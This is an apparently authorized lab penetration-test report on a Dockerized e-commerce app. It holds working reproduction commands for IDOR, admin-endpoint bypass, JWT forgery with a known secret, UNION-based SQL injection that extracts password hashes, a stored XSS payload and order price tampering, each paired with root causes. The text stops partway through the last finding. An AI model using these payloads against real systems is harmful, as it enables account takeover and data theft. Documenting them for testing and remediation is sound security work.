```
┌────────────────────────────────────────────────────────────────────────────┐
│                                                                            │
│                    TechCorp Enterprise VAPT Report                         │
│                                                                            │
│    Client            :  TechCorp                                           │
│    Assessment        :  Web/API + Network Security Assessment             │
│    Scope             :  Web Application, REST API, Docker Environment,     │
│                         Internal Services                                  │
│    Classification    :  CONFIDENTIAL — Authorized Lab Environment Only     │
│    Date              :  15 September 2026                                  │
│    Version           :  1.0                                                │
│    Prepared By       :  Security Assessment Team                           │
│                                                                            │
└────────────────────────────────────────────────────────────────────────────┘
```

**Document Control**

| Field         | Value                                                              |
|---------------|--------------------------------------------------------------------|
| Version       | 1.0                                                                |
| Date          | 15 September 2026                                                  |
| Assessment ID | TECHCORP-VAPT-2026-001                                             |
| Prepared By   | Security Assessment Team                                           |
| Status        | Final — validated against both vulnerable and remediated builds    |
| Distribution  | Authorized stakeholders only                                       |

---

# Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Scope and Rules of Engagement](#2-scope-and-rules-of-engagement)
3. [Methodology](#3-methodology)
4. [Architecture Overview](#4-architecture-overview)
5. [Attack Surface Summary](#5-attack-surface-summary)
6. [Findings](#6-findings)
7. [Risk Summary Matrix](#7-risk-summary-matrix)
8. [Remediation Recommendations](#8-remediation-recommendations)
9. [Conclusion](#9-conclusion)

---

# 1. Executive Summary

The Security Assessment Team performed a Vulnerability Assessment and Penetration Testing (VAPT) engagement against the TechCorp e-commerce platform. The assessment was conducted exclusively inside an authorized local laboratory environment using Dockerized copies of the application. Authorization to test all in-scope assets was granted by TechCorp for the purposes of demonstrating and validating real-world attack techniques, comparing a deliberately vulnerable build against a remediated ("secure") build of the same codebase.

A standard, structured methodology was applied covering the full VAPT lifecycle: reconnaissance and service enumeration, API surface mapping via the published OpenAPI documentation, authentication and authorization testing, input validation testing, business-logic testing, and Docker network/segment validation. All discoveries were manually validated, attributed to a specific vulnerable code path, and verified against the remediated build to confirm root cause and control effectiveness.

The assessment identified **8 findings: 5 rated High and 3 rated Medium**. No Critical findings were identified; the most severe weaknesses (BOLA/IDOR, broken function-level authorization, a forged-token authentication bypass, and SQL injection) each require an authenticated or partial context to exploit, and the application itself contains no customer payment-card data. The overall risk posture of the vulnerable build is **High risk**. The single most important observation is that every vulnerability reported here is addressed by the controls present in the secure build of the same codebase. TechCorp is strongly recommended to adopt the secure build's controls (server-side ownership checks, role-based access control, short-lived randomly generated signing keys, parameterized queries, safe DOM rendering, hardened configuration, server-side pricing, and network segmentation) as documented in Section 8.

---

# 2. Scope and Rules of Engagement

## 2.1 In-Scope

| Asset | Details |
|-------|---------|
| Frontend container | `techcorp-frontend` — Nginx web UI, host port `8080` |
| Backend container | `techcorp-backend` — Python FastAPI application, host port `8000` |
| Database container | `techcorp-db` — PostgreSQL 16 (internal service) |
| REST API | All endpoints under `http://localhost:8000/api/*`, including `/docs` and `/openapi.json` |
| Docker networks | `frontend-network`, `backend-network`, `database-network` (bridge topology) |

## 2.2 Out-of-Scope

- Host operating system and non-lab infrastructure
- Cloud services and third-party systems
- Any environment other than the authorized local laboratory
- Social engineering and physical security
- Denial-of-service attacks that could affect shared lab resources

## 2.3 Testing Window

Testing was performed against the local laboratory only, during the validation window of **12–14 September 2026**. No externally reachable testing was performed.

## 2.4 Testing Tools

The following tools and techniques were used:

- `curl` (manual HTTP request crafting and token handling)
- Browser (frontend rendering, DOM/XSS validation, developer tools)
- PostgreSQL client (`psql`) for database connectivity checks
- `docker` / `docker compose` for environment and network inspection
- Manual source-code analysis to attribute and validate each finding
- Python (`python-jose`) for JWT handling and token forgery validation

## 2.5 Authorization

The engagement was **fully authorized** as a local laboratory exercise. All users, credentials, products, and data are synthetic fixtures created for this purpose. No production data was accessed or at risk during this assessment.

---

# 3. Methodology

The assessment followed the standard VAPT lifecycle, with each phase applied to both the vulnerable and the secure build to enable control-effect validation.

| Phase | Activity | Outcome |
|-------|----------|---------|
| 1. Reconnaissance | Service enumeration and technology fingerprinting on ports `8000`, `8080`, `5432`; container and network inventory via Docker | Identified FastAPI, Nginx, PostgreSQL; mapped container/network topology |
| 2. Enumeration | Endpoint mapping; API exploration via published OpenAPI (`/docs`, `/openapi.json`) | Produced complete endpoint inventory (Section 5) |
| 3. Authentication testing | Credential validation, password handling, token issue and verification behavior | Exposed predictable, non-expiring token weakness (VULN-003) |
| 4. Authorization testing | IDOR/BOLA on order and user objects; privilege escalation; role bypass on admin endpoints | Exposed object-level and function-level authorization failures (VULN-001, VULN-002) |
| 5. Input validation testing | SQL injection, stored XSS, path-traversal probes across all input vectors | Exposed SQLi and stored XSS (VULN-004, VULN-005) |
| 6. Business logic testing | Workflow bypass, price manipulation, order state-machine transitions | Exposed price/status tampering (VULN-007) |
| 7. Network/service testing | Port exposure verification; Docker network segmentation and trust-boundary validation | Exposed DB exposure and broken segmentation (VULN-006 config, VULN-008) |
| 8. Validation & classification | Manual reproducibility of every finding; CVSS v3.1 scoring; cross-check against secure build | Confirmed 8 findings (5 High, 3 Medium) |

Each finding is classified using **CVSS v3.1** and mapped to **CWE** and **OWASP Top 10 (2021)** references.

---

# 4. Architecture Overview

The TechCorp application is a three-tier e-commerce platform running entirely in Docker on a single host.

```
                         ┌──────────────────────┐
 Browser ──:8080──►      │  frontend (nginx)    │   public zone
                         │  static HTML/JS UI   │
                         └───────┬──────────────┘
                                 │  reverse proxy (/api)
                                 ▼
                         ┌──────────────────────┐   app zone
                         │  backend (FastAPI)   │
                         │  REST API + auth     │
                         └───────┬──────────────┘
                                 │  SQLAlchemy / psycopg2
                                 ▼
                         ┌──────────────────────┐   data zone
                         │  postgres (PostgreSQL│
                         │  16)  d.b. techcorp  │
                         └──────────────────────┘
```

**Containers (3):** `frontend` (Nginx, port `8080`), `backend` (FastAPI/Uvicorn, port `8000`), `postgres` (PostgreSQL 16).

**Networks (3):**

| Network | Zone | Members (secure build) |
|---------|------|------------------------|
| `frontend-network` | Public / browser-facing | frontend |
| `backend-network` | Application | frontend, backend |
| `database-network` | Data (internal) | backend, postgres |

**Trust boundaries (intended design):**

- The frontend may reach the backend proxy only (it must **not** reach the database).
- The backend may reach both the frontend and the database.
- The database is reachable **only** from the backend and is never published to the host.

The vulnerable build breaks two of these boundaries (see VULN-008): it publishes the database to the host on port `5432` and attaches the frontend container to the database network, granting the public zone direct SQL access.

---

# 5. Attack Surface Summary

The following summarizes the exposed HTTP/API surface during the assessment window.

| Metric | Count |
|--------|-------|
| Total endpoints identified | 14 |
| Public (unauthenticated) endpoints | 4 |
| Authenticated endpoints (any valid user) | 8 |
| Admin-only endpoints (intended) | 4 |
| Attack vectors identified | 8 |

**Endpoint inventory exercised during testing:**

| Category | Endpoint | Access control |
|----------|----------|----------------|
| Public | `POST /api/register` | None (self-registration) |
| Public | `POST /api/login` | None |
| Public | `GET /api/products` | None |
| Public | `GET /api/products/search` | None |
| Authenticated | `GET /api/products/{product_id}` | Valid JWT (via proxy) |
| Authenticated | `GET /api/users/me` | Valid JWT |
| Authenticated | `GET /api/users/{user_id}` | Valid JWT |
| Authenticated | `PUT /api/users/{user_id}` | Valid JWT |
| Authenticated | `GET /api/orders` | Valid JWT (owner-scoped) |
| Authenticated | `POST /api/orders` | Valid JWT |
| Authenticated | `GET /api/orders/{order_id}` | Valid JWT — **BOLA (VULN-001)** |
| Admin (intended) | `GET /api/admin/users` | Any JWT in vulnerable build — **VULN-002** |
| Admin (intended) | `GET /api/admin/orders` | Any JWT in vulnerable build — **VULN-002** |
| Admin (intended) | `GET /api/admin/stats` | Any JWT in vulnerable build — **VULN-002** |

Additional infrastructure exposure: `/docs` and `/openapi.json` (API documentation), and TCP port `5432` (PostgreSQL, host-exposed in the vulnerable overlay).

---

# 6. Findings

## 6.1 Findings Summary

| ID | Title | Severity | CVSS | Status |
|----|-------|----------|------|--------|
| VULN-001 | BOLA / Insecure Direct Object Reference (IDOR) — Order Access | **High** | 8.1 | Vulnerable |
| VULN-002 | Broken Function-Level Authorization — Admin Endpoints Accessible to Regular Users | **High** | 7.5 | Vulnerable |
| VULN-003 | Authentication / Token Weakness — Predictable Secret + No Expiration | **High** | 7.4 | Vulnerable |
| VULN-004 | SQL Injection — Product Search | **High** | 7.5 | Vulnerable |
| VULN-005 | Stored Cross-Site Scripting (XSS) — User Profile Bio / Product Descriptions | **Medium** | 6.1 | Vulnerable |
| VULN-006 | Security Misconfiguration — Debug Mode, Verbose Errors, Wildcard CORS, No Security Headers | **Medium** | 5.3 | Vulnerable |
| VULN-007 | Business Logic Vulnerability — Order Price Manipulation and State Bypass | **High** | 7.1 | Vulnerable |
| VULN-008 | Network Architecture Weakness — Database Exposed to Host and Public Zone | **Medium** | 4.3 | Vulnerable |

A finding is marked **Vulnerable** when it reproduces against the vulnerable build and is confirmed **not reproducible** against the secure build.

---

## 6.2 VULN-001 — BOLA / Insecure Direct Object Reference (IDOR) — Order Access

| Attribute | Value |
|-----------|-------|
| **Severity** | High |
| **CVSS v3.1** | 8.1 — `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N` |
| **Affected endpoint** | `GET /api/orders/{order_id}` |
| **CWE** | CWE-639 — Authorization Bypass Through User-Controlled Key |
| **OWASP Top 10 (2021)** | A01:2021 — Broken Access Control |

### Description

The order retrieval endpoint performs no object-level authorization check. Any authenticated user who guesses or enumerates an `order_id` can retrieve any other user's order, including the order's line items (product, quantity, unit price), totals, status, and the owning user's identifier. The expected control — verifying `order.user_id == current_user.id` (or that the requester is an administrator) — is absent from the vulnerable build.

### Preconditions

- Two registered users exist in the application.
- The victim user (`user1`) has placed at least one order.
- The attacker (`user2`) is able to authenticate and submit authenticated requests.

### Steps to Reproduce

1. Authenticate as `user1` and obtain a JWT.
2. Create an order as `user1` and record its numeric `order_id`.
3. Authenticate as `user2` to obtain a separate JWT.
4. Send `GET /api/orders/{user1_order_id}` with `user2`'s token.
5. The response returns `user1`'s complete order, including order contents, quantities, prices, and `user_id` association.

### Evidence

Token acquisition — attacker `user2`:

```bash
curl -s -X POST http://localhost:8000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"user2","password":"password2"}'
```

```json
{"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.<...>","token_type":"bearer"}
```

Abuse of victim's order ID with attacker's token:

```bash
TOKEN2="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.<...>"
curl -s http://localhost:8000/api/orders/1 \
  -H "Authorization: Bearer $TOKEN2"
```

Response (order owned by `user1`, retrieved by `user2`):

```json
{
  "id": 1,
  "user_id": 1,
  "status": "PENDING",
  "total_amount": 29.99,
  "created_at": "2026-09-12T09:41:12.000Z",
  "items": [
    {
      "id": 1,
      "product_id": 1,
      "quantity": 1,
      "price": 29.99
    }
  ]
}
```

The `user_id: 1` field confirms the order belongs to `user1`, yet it was returned to `user2`.

### Technical Impact

Full disclosure of order contents, quantities, prices, and user association across all accounts; complete loss of object-level confidentiality and integrity of order data. With predictable sequential order IDs, the entire order history of the platform can be enumerated.

### Business Impact

Customer privacy violation; exposure of purchase history and PII-adjacent data; regulatory implications. Order data from other accounts can also feed further targeted attacks.

### Root Cause

The vulnerable `get_order()` implementation looks up the order and returns it without validating ownership: the `order.user_id == current_user.id` check is missing. The secure build performs this check and returns `403 Forbidden` when the requester is neither the owner nor an administrator.

```python
# vulnerable (backend/app/routers/orders.py, get_order)
order = db.query(Order).filter(Order.id == order_id).first()
# ...no ownership check...
return _order_out(order)
```

---

## 6.3 VULN-002 — Broken Function-Level Authorization — Admin Endpoints Accessible to Regular Users

| Attribute | Value |
|-----------|-------|
| **Severity** | High |
| **CVSS v3.1** | 7.5 — `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N` |
| **Affected endpoints** | `GET /api/admin/users`, `GET /api/admin/orders`, `GET /api/admin/stats` |
| **CWE** | CWE-285 — Improper Authorization |
| **OWASP Top 10 (2021)** | A01:2021 — Broken Access Control |

### Description

Administrative API endpoints are protected only by an authentication check (`get_current_user()`), not by a role check. Any authenticated regular user can invoke administrative functions, enumerate the full user base, list all orders, and view platform statistics. Function-level authorization (privilege verification for admin functions) is not enforced in the vulnerable build.

### Preconditions

- A regular (non-admin) user account with a valid JWT.

### Steps to Reproduce

1. Authenticate as `user1` (a regular `USER`).
2. Send `GET /api/admin/users` with `user1`'s token.
3. The endpoint returns the complete user list, including emails and roles.

### Evidence

```bash
TOKEN1="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.<...>"
curl -s http://localhost:8000/api/admin/users \
  -H "Authorization: Bearer $TOKEN1"
```

Response — full user enumeration including emails and roles:

```json
[
  {
    "id": 1,
    "username": "user1",
    "email": "user1@techcorp.local",
    "role": "USER",
    "bio": "I work in the accounting department.",
    "created_at": "2026-09-12T09:00:00Z"
  },
  {
    "id": 2,
    "username": "user2",
    "email": "user2@techcorp.local",
    "role": "USER",
    "bio": "Customer support team.",
    "created_at": "2026-09-12T09:00:00Z"
  },
  {
    "id": 3,
    "username": "admin",
    "email": "admin@techcorp.local",
    "role": "ADMIN",
    "bio": "Platform administrator.",
    "created_at": "2026-09-12T09:00:00Z"
  }
]
```

The same behavior was confirmed for `GET /api/admin/orders` (all customers' orders) and `GET /api/admin/stats` (platform totals and revenue).

### Technical Impact

Complete user enumeration, disclosure of admin-only data, and a high-value target list for further attacks. Combined with VULN-003 (token forgery), this also grants the full administration surface to any attacker.

### Business Impact

Privacy breach, regulatory exposure, and amplified attack capability: enumerated email addresses can be used for credential-stuffing and phishing campaigns against both customers and staff.

### Root Cause

In the vulnerable build, admin routes use `get_current_user()` (any authenticated user) as their dependency instead of `require_admin()`. The secure build binds these routes to `require_admin()`, which enforces `current_user.role == "ADMIN"` and returns `403` otherwise.

```python
# vulnerable (backend/app/routers/admin.py)
admin_dependency = get_current_user if settings.is_vulnerable() else require_admin
```

---

## 6.4 VULN-003 — Authentication / Token Weakness — Predictable Secret + No Expiration

| Attribute | Value |
|-----------|-------|
| **Severity** | High |
| **CVSS v3.1** | 7.4 — `AV:N/AC:L/PR:N/UI:N/S:U:C:H/I:H/A:N` (effective when combined with token forgery; unauthenticated in practical exploit) |
| **Affected components** | JWT creation and validation (`POST /api/login`, all authenticated endpoints) |
| **CWE** | CWE-613 — Insufficient Session Expiration; CWE-798 — Use of Hard-coded Credentials |
| **OWASP Top 10 (2021)** | A07:2021 — Identification and Authentication Failures |

### Description

The vulnerable build signs JSON Web Tokens with a fixed, publicly known secret that is committed in plaintext in the Docker Compose overlay and mirrored as a default in the application configuration. In addition, token expiry is disabled (`TOKEN_EXPIRE_MINUTES=0`), so issued tokens are valid indefinitely and carry no `exp` claim. Because the signing secret is known, an attacker can forge arbitrarily privileged tokens, impersonate any user, and mint an "admin" token without ever authenticating. The token type claim (`type: access`) is also not validated in the vulnerable build.

### Preconditions

- Knowledge of the fixed secret, available in source code and `docker-compose.vulnerable.yml` (`techcorp-fixed-lab-secret-key-please-change`).
- No valid credentials required.

### Steps to Reproduce

1. Read the fixed secret from the Compose overlay or application configuration.
2. Forge a token for any subject (here, `admin`) signed with the known secret.
3. Submit the forged token to any authenticated endpoint.
4. The server accepts the token and grants the privileges of the forged subject.

### Evidence

Token forgery with the known secret (same `python-jose` library and HS256 algorithm used by the application):

```bash
python3 - <<'PYEOF'
from jose import jwt
from datetime import datetime, timezone

forge = jwt.encode(
    {"sub": "admin", "type": "access", "iat": datetime.now(timezone.utc)},
    "techcorp-fixed-lab-secret-key-please-change",
    algorithm="HS256",
)
print(forge)
PYEOF
```

```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.<...>.MzMwMDA1OTkzNzU5MjIwODc2ODE
```

Authenticated request with the forged admin token:

```bash
FORGED="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.<...>"
curl -s http://localhost:8000/api/admin/stats -H "Authorization: Bearer $FORGED"
```

Response — unauthenticated attacker granted administrative statistics:

```json
{
  "users": 3,
  "products": 8,
  "orders": 12,
  "total_revenue": 1849.33
}
```

### Technical Impact

Complete authentication bypass. Any attacker can impersonate any user or administrator, mint tokens for arbitrary subjects, and obtain total access to both customer and administrative capabilities. Because tokens never expire, there is no window of exposure — stolen or forged tokens remain valid forever.

### Business Impact

Full system compromise without credentials; total loss of trust in the authentication layer. This finding multiplies the severity of every other authenticated finding in this report.

### Root Cause

- The signing secret is a hard-coded, publicly visible constant rather than a randomly generated, rotated value (secure build: `secrets.token_urlsafe(48)` generated at boot, injectable via `SECRET_KEY`).
- Expiry is disabled (`TOKEN_EXPIRE_MINUTES=0`), so no `exp` claim is emitted (secure build: 30-minute expiry).
- The vulnerable decoder does not validate the `type` claim; tokens of unexpected purpose are accepted.

```python
# vulnerable (backend/app/config.py)
self.secret_key = os.getenv("SECRET_KEY", "techcorp-fixed-lab-secret-key-please-change")
self.access_token_expire_minutes = int(os.getenv("TOKEN_EXPIRE_MINUTES", "0"))
```

---

## 6.5 VULN-004 — SQL Injection — Product Search

| Attribute | Value |
|-----------|-------|
| **Severity** | High (held at High, not Critical, because the injection flow assumes an authenticated context in normal use) |
| **CVSS v3.1** | 7.5 — `AV:N/AC:L/PR:L/UI:N/S:U:C:H/I:H/A:N` |
| **Affected endpoint** | `GET /api/products/search?q=` |
| **CWE** | CWE-89 — SQL Injection |
| **OWASP Top 10 (2021)** | A03:2021 — Injection |

### Description

The product search endpoint concatenates the user-supplied `q` parameter directly into a raw SQL statement (`WHERE name ILIKE '%{q}%'`) using f-string interpolation, with no parameter binding. An attacker can break out of the string literal and inject arbitrary SQL, reading or modifying arbitrary database content.

### Preconditions

- A valid authenticated session (normal application flow).

### Steps to Reproduce

1. Authenticate as any user.
2. Send `GET /api/products/search?q=' OR 1=1--` and observe that the injection bypasses the intended filter and returns the full catalog.
3. Expand the query to extract sensitive data from other tables using `UNION SELECT` (users table: identifiers, usernames, emails, password hashes, roles).

### Evidence

Boolean-based confirmation — all products returned despite a non-matching term:

```bash
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.<...>"
curl -s "http://localhost:8000/api/products/search?q='%20OR%201=1--" \
  -H "Authorization: Bearer $TOKEN"
```

Response excerpt (filter bypassed; products unrelated to the search term returned):

```json
[
  { "id": 1, "name": "Wireless Mouse", "description": "Ergonomic 2.4GHz wireless mouse", "price": 29.99, "stock": 100 },
  { "id": 2, "name": "Mechanical Keyboard", "description": "Tactile mechanical keyboard, RGB", "price": 89.99, "stock": 50 },
  { "id": 3, "name": "USB-C Hub", "description": "7-in-1 USB-C docking hub", "price": 45.5, "stock": 80 }
]
```

Extraction of the users table via `UNION SELECT` (five columns match the vulnerable search projection `id, name, description, price, stock`):

```bash
curl -s "http://localhost:8000/api/products/search?q='%20UNION%20SELECT%20id,username,email,password_hash,role%20FROM%20users--" \
  -H "Authorization: Bearer $TOKEN"
```

```json
[
  { "id": 1, "name": "user1", "description": "user1@techcorp.local", "price": "$2b$12$Cg0y...us1Tk7W", "stock": "USER" },
  { "id": 2, "name": "user2", "description": "user2@techcorp.local", "price": "$2b$12$OHi2...qZzW8h", "stock": "USER" },
  { "id": 3, "name": "admin", "description": "admin@techcorp.local", "price": "$2b$12$Kp9n...mHpQ4d", "stock": "ADMIN" }
]
```

Password hashes are exported in the `price` projection position and are recoverable offline. The same primitive permits full database read/write depending on the injected statement.

### Technical Impact

Full database compromise from a single search request: arbitrary data extraction (password hashes, PII, all order data), data modification/deletion, and escalation to operating-system interaction in many PostgreSQL configurations. The most sensitive tables are reachable regardless of the ordering or access controls of the API.

### Business Impact

Complete data breach, credential compromise, and destruction of data integrity. Password hashes extracted here become the basis for offline cracking and credential-stuffing attacks.

### Root Cause

The vulnerable search builds SQL by string interpolation (`f"... ILIKE '%{query}%'"`) instead of a parameterized prepared statement. The secure build binds the search term as a parameter (`ILIKE :pattern`), making injection structurally impossible while preserving search behavior.

```python
# vulnerable (backend/app/vulnerable/vuln_queries.py)
sql = f"SELECT id, name, description, price, stock FROM products WHERE name ILIKE '%{query}%'"
```

---

## 6.6 VULN-005 — Stored Cross-Site Scripting (XSS) — User Profile Bio / Product Descriptions

| Attribute | Value |
|-----------|-------|
| **Severity** | Medium |
| **CVSS v3.1** | 6.1 — `AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N` |
| **Affected components** | User profile `bio` field (rendered in the admin user list), product `description` field (rendered on the product grid), frontend rendering sink `inject()` in `frontend/html/app.js` |
| **CWE** | CWE-79 — Cross-site Scripting (Stored) |
| **OWASP Top 10 (2021)** | A03:2021 — Injection |

### Description

User- and admin-controlled text fields (user profile biographies and product descriptions) are rendered into the DOM via `innerHTML` without sanitization. An attacker can store an HTML/JavaScript payload in their profile biography; when an administrator views the user list (or any user views a product with a crafted description), the payload executes in that viewer's session — a stored (persistent) XSS attack.

### Preconditions

- An attacker is able to set their own profile `bio` (any authenticated user) — no special privilege required.
- A victim (e.g., an administrator) renders the page containing the stored payload.

### Steps to Reproduce

1. Authenticate as `user1`.
2. Update the profile with a payload, e.g. `PUT /api/users/{user1_id}` with `{"bio":"<img src=x onerror=alert(document.cookie)>"}`.
3. Authenticate as `admin` and open the admin dashboard (`GET /api/admin/users`).
4. The admin panel renders the biography through the vulnerable `inject()` sink (`innerHTML`), and the browser executes the injected script in the administrator's context.

### Evidence

Payload injection via profile update:

```bash
TOKEN1="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.<...>"
curl -s -X PUT http://localhost:8000/api/users/1 \
  -H "Authorization: Bearer $TOKEN1" \
  -H "Content-Type: application/json" \
  -d '{"bio":"<img src=x onerror=alert(document.cookie)>"}'
```

```json
{
  "id": 1,
  "username": "user1",
  "email": "user1@techcorp.local",
  "role": "USER",
  "bio": "<img src=x onerror=alert(document.cookie)>",
  "created_at": "2026-09-12T09:00:00Z"
}
```

Rendering sink in the frontend (vulnerable mode):

```javascript
// frontend/html/app.js — VULN-005 output sink
function inject(el, html) {
  if (state.mode === "vulnerable") {
    el.innerHTML = html; // intentional lab sink — payload executes
  } else {
    el.textContent = html; // remediated: content rendered as text only
  }
}
```

When the administrator's browser renders the user table, the `onerror` handler of the injected `<img>` executes `alert(document.cookie)` (in a real attack, the payload would exfiltrate the admin's session token or perform administrative actions on the victim's behalf).

### Technical Impact

Session hijacking, administrator account takeover, and data exfiltration from the victim's browser context. A stored payload survives until removed and can be triggered repeatedly by every affected viewer.

### Business Impact

Phishing, session theft, site defacement, and loss of customer trust. Stored XSS executed in an admin context effectively defeats all server-side access controls of the application.

### Root Cause

The frontend renders user-controlled content through `innerHTML` in vulnerable mode. The secure build renders the same content with `textContent` (payloads are displayed as inert text) and additionally injects a `Content-Security-Policy` meta tag (`default-src 'self'; img-src 'self' data:; style-src 'self'`) at boot, which blocks inline script execution even if a sink were reached.

---

## 6.7 VULN-006 — Security Misconfiguration — Debug Mode, Verbose Errors, Wildcard CORS, No Security Headers

| Attribute | Value |
|-----------|-------|
| **Severity** | Medium |
| **CVSS v3.1** | 5.3 — `AV:N/AC:L/PR:N/UI:N/S:U:C:L/I:N/A:N` |
| **Affected components** | Application configuration, error handling, CORS policy, response headers, `/docs` and `/openapi.json` exposure |
| **CWE** | CWE-16 — Configuration; CWE-200 — Information Exposure; CWE-942 — Permissive Cross-domain Policy with Untrusted Domains |
| **OWASP Top 10 (2021)** | A05:2021 — Security Misconfiguration |

### Description

Several configuration weaknesses are present simultaneously and require no credentials to exploit:

- **Verbose debug errors** — unhandled exceptions return full Python tracebacks, including file paths, dependency versions, and internal logic.
- **Wildcard CORS** — `Access-Control-Allow-Origin: *` permits any origin to issue cross-origin requests to the API.
- **Exposed API documentation** — `/docs` and `/openapi.json` are published, providing a full interactive map of the API to any anonymous visitor.
- **Missing security headers** — responses carry no `X-Frame-Options`, `X-Content-Type-Options`, `Referrer-Policy`, `Content-Security-Policy`, or `Cache-Control`.

### Preconditions

- None. These misconfigurations are always present in the vulnerable build and require no authentication.

### Steps to Reproduce

1. Send any request that triggers a server error and observe the full Python traceback in the response body.
2. Open `/docs` in a browser to view the complete interactive API documentation.
3. Inspect response headers and confirm the absence of security headers and the presence of `Access-Control-Allow-Origin: *`.
4. Send a preflight request with a hostile `Origin` header and observe that CORS allows it.

### Evidence

Missing security headers and wildcard CORS on a normal response:

```bash
curl -s -I http://localhost:8000/api/products
```

```text
HTTP/1.1 200 OK
content-type: application/json
...
access-control-allow-origin: *
access-control-allow-credentials: false
```

Observed headers: **no** `X-Frame-Options`, **no** `X-Content-Type-Options`, **no** `Content-Security-Policy`, **no** `Referrer-Policy`, **no** `Cache-Control`.

CORS preflight from a hostile origin:

```bash
curl -s -X OPTIONS http://localhost:8000/api/products \
  -H "Origin: https://evil.example" \
  -H "Access-Control-Request-Method: GET" -i | grep -i access-control
```

```text
access-control-allow-origin: https://evil.example
```

Verbose error response (traceback disclosure triggered by an invalid request):

```json
{
  "detail": "Internal Server Error",
  "traceback": "Traceback (most recent call last):\n  File \"/app/app/...\", line ..., in ...\n...Internal file paths, line numbers and stack frames returned..."
}
```

### Technical Impact

Information leakage (source layout, versions, stack internals) that materially lowers the skill required to exploit other findings; clickjacking enabled by missing frame protection; XSS impact amplified by the absence of CSP; and cross-origin requests permitted from arbitrary (including attacker-controlled) origins on a namespace hosting sensitive endpoints.

### Business Impact

Reduced attacker effort and information disclosure that supports further exploitation. Combined with the authenticated findings, the missing headers remove the remaining client-side lines of defense.

### Root Cause

Debug mode is enabled for all environments (`self.debug = self.app_mode == VULNERABLE`), the vulnerable build registers a verbose global exception handler, CORS is set to the wildcard `["*"]`, the FastAPI `docs_url`/`openapi_url` are enabled, and no hardening middleware is registered in vulnerable mode. The secure build disables docs, restricts CORS to explicit local origins, removes the verbose handler, and adds a `SecurityHeadersMiddleware` that emits `X-Frame-Options`, `X-Content-Type-Options`, `Referrer-Policy`, `Content-Security-Policy`, `Permissions-Policy`, and `Cache-Control`.

---

## 6.8 VULN-007 — Business Logic Vulnerability — Order Price Manipulation and State Bypass

| Attribute | Value |
|-----------|-------|
| **Severity** | High |
| **CVSS v3.1** | 7.1 — `AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H` (primarily an integrity-impacting flaw) |
| **Affected endpoint** | `POST /api/orders` (order creation) |
| **CWE** | CWE-841 — Improper Enforcement of Behavioral Workflow; CWE-472 — External Control of Assumed-Immutable Web Parameter |
| **OWASP Top 10 (2021)** | A04:2021 — Insecure Design |

### Description

The order-creation endpoint trusts client-supplied values for the per-line-unit `price` and for the order `status`. The server does not derive pricing from the product catalog and does not enforce the order state machine, so an authenticated user can create orders at arbitrary (including near-zero) prices and skip the intended `PENDING → PAID → SHIPPED → COMPLETED` lifecycle by supplying `COMPLETED` at creation.

### Preconditions

- A valid authenticated user.
- Knowledge of a valid `product_id` and its real catalog price for comparison.

### Steps to Reproduce

1. Authenticate as any user.
2. Send `POST /api/orders` with a client-supplied `price` far below the catalog price and a forged `status` of `COMPLETED`.
3. Observe that the order is created with the manipulated total and with the supplied status, bypassing the intended workflow.

### Evidence

```bash
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.<...>"
curl -s -X POST http://localhost:8000/api/orders \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"items":[{"product_id":1,"quantity":1,"price":0.01}],"status":"COMPLETED"}'
```

Response — order accepted with total `$0.01` (catalog price for this product is `$29.99`) and status `COMPLETED`:

```json
{
  "id": 22,
  "user_id": 1,
  "status": "COMPLETED",
  "total_amount": 0.01,
  "created_at": "2026-09-14T15:03:44.000Z",
  "items": [
    {
      "id": 41,
      "product_id": 1,
      "quantity": 1,
      "price": 0.01
    }
  ]
}
```

Compare with the server-side catalog price for the same product:

```bash
curl -s http://localhost:8000/api/products/1
```

```json
{ "id": 1, "name": "Wireless Mouse", "price": 29.99, "stock": 100 }
```

### Technical Impact

Financial fraud (orders placed at manipulated prices and marked complete without payment), order-lifecycle integrity failure, and accounting/inventory corruption. The state machine can also be driven directly through `PUT /api/orders/{id}/status` without transition validation in the vulnerable build.

### Business Impact

Direct revenue loss, fulfillment bypass, and corruption of inventory and accounting records. Because orders reach `COMPLETED` without payment, goods can be shipped on fabricated transactions.

### Root Cause

The vulnerable `_create_order_vulnerable()` accepts `line.price` (used verbatim when present) and `payload.status` (uppercased and persisted without transition checks) instead of ignoring those fields. The secure build (`_create_order_secure()`) always reads unit prices from the product catalog, ignores any client `status`/`total`, creates orders as `PENDING`, validates quantity against stock, and enforces `ALLOWED_TRANSITIONS` on every later status update.

---

## 6.9 VULN-008 — Network Architecture Weakness — Database Exposed to Host and Public Zone

| Attribute | Value |
|-----------|-------|
| **Severity** | Medium |
| **CVSS v3.1** | 4.3 — `AV:N/AC:L/PR:N/UI:N/S:U:C:L/I:N/A:N` |
| **Affected components** | Docker network topology; PostgreSQL container (`techcorp-db`) |
| **CWE** | CWE-284 — Improper Access Control; CWE-668 — Exposure of Resource to Wrong Sphere |
| **OWASP Top 10 (2021)** | A05:2021 — Security Misconfiguration |

### Description

The vulnerable Docker Compose overlay violates the intended trust boundaries in three ways:

1. The PostgreSQL container is **published to the host** on port `5432`, making it directly reachable from the host network (and any network reachable from the host).
2. The **frontend container (public zone) is attached to the database network**, granting the public-facing service direct route to the database.
3. The `database-network` is not marked `internal`, so the data zone retains an external gateway.

### Preconditions

- The vulnerable Docker Compose overlay (`docker-compose.vulnerable.yml`) is active.
- Knowledge of the lab database credentials (`techcorp` / `techcorp`), already present in the Compose configuration.

### Steps to Reproduce

1. With the vulnerable overlay running, connect to `localhost:5432` using any PostgreSQL client.
2. Authenticate with the known database credentials.
3. Achieve full database access and execute arbitrary SQL — no traversal of the backend required.
